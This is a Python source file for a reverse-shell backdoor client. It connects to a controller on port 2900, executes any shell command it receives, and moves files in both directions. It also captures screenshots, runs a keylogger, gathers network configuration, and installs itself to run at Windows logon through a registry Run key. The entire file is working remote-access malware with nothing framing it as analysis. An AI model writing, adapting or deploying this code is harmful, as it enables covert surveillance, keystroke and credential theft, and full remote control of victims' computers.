import json
import socket
import subprocess
import os
import time

import pyautogui
import keylogger
import threading
import shutil
import sys

def reliable_send(data):
    jsondata = json.dumps(data)
    s.send(jsondata.encode())


def reliable_recv():
    data = ''
    while True:
        try:
            data = data + s.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

def remove_file(file_name):
    os.remove(file_name)

def ipconfig_tim():
    with open('ipconfig.txt', 'wb') as f:
        output = subprocess.check_output(['ipconfig'], shell=True)
        f.write(output)


def dir_tim():
    current_dir = os.getcwd()

    files = os.listdir(current_dir)

    with open("dir.txt", "w") as f:
        for file in files:
            f.write(file + "\n")

def createfile():
    while True:
        namefile = input("Give the file a name :")
        if not namefile:
            break

        text = input("Write a text for the file :")

        with open(namefile, 'w') as f:
            f.write(text)


def download_file(file_name):
    f = open(file_name, 'wb')
    s.settimeout(1)
    chunk = s.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = s.recv(1024)
        except socket.timeout as e:
            break
    s.settimeout(None)
    f.close()

def upload_file(file_name):
    f = open(file_name, 'rb')
    s.send(f.read())

def screenshot():
    mySreenshot = pyautogui.screenshot()
    mySreenshot.save('screen.png')

def persist(reg_name, copy_name):
    file_location = os.environ['appdata'] + '\\' + copy_name
    try:
        if not os.path.exists(file_location):
            shutil.copyfile(sys.executable, file_location)
            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v ' + reg_name + ' /t REG_SZ /d "' + file_location + '"', shell=True)
            reliable_send('[+]  Created Persistence With Reg Key: ' + reg_name)
        else:
            reliable_send('[+] Persistence Already Exists')
    except:
        reliable_send('[+] Error Creating Persistence With The Target Machine')



def connection():
    while True:
        time.sleep(10)
        try:
            hostname = socket.gethostname()
            IPAddr = socket.gethostbyname(hostname)
            s.connect((IPAddr, 2900))
            shell()
            s.close()
            break
        except:
            pass


def shell():
    while True:
        command = reliable_recv()
        if command == 'quit':
            break
        elif command == 'help':
            pass
        elif command == 'clear':
            pass
        elif command[:3] == 'cd ':
            os.chdir(command[3:])
        elif command[:6] == 'upload':
            download_file(command[7:])
        elif command[:8] == 'download':
            upload_file(command[9:])
        elif command[:10] == 'screenshot':
            screenshot()
            upload_file('screen.png')
            os.remove('screen.png')
        elif command[:3] == 'dir':
            dir_tim()
            upload_file('dir.txt')
            os.remove('dir.txt')
        elif command[:7] == 'remove ':
            remove_file(command[7:])
        elif command[:8] == 'ipconfig':
            ipconfig_tim()
            upload_file('ipconfig.txt')
            os.remove('ipconfig.txt')
        elif command[:11] == 'createfile ':
            createfile(command[11:])
        elif command[:12] == 'keylog_start':
            keylog = keylogger.Keylogger()
            t = threading.Thread(target=keylog.start)
            t.start()
            reliable_send('[+] Keylogger Started!')
        elif command[:11] == 'keylog_dump':
            logs = keylog.read_logs()
            reliable_send(logs)
        elif command[:11] == 'keylog_stop':
            keylog.self_destruct()
            t.join()
            reliable_send('[+] Keylogger Stopped!')
        elif command[:11] == 'persistence':
            reg_name, copy_name = command[12:].split(' ')
            persist(reg_name, copy_name)
        else:
            execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            result = execute.stdout.read() + execute.stderr.read()
            result = result.decode()
            reliable_send(result)


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection()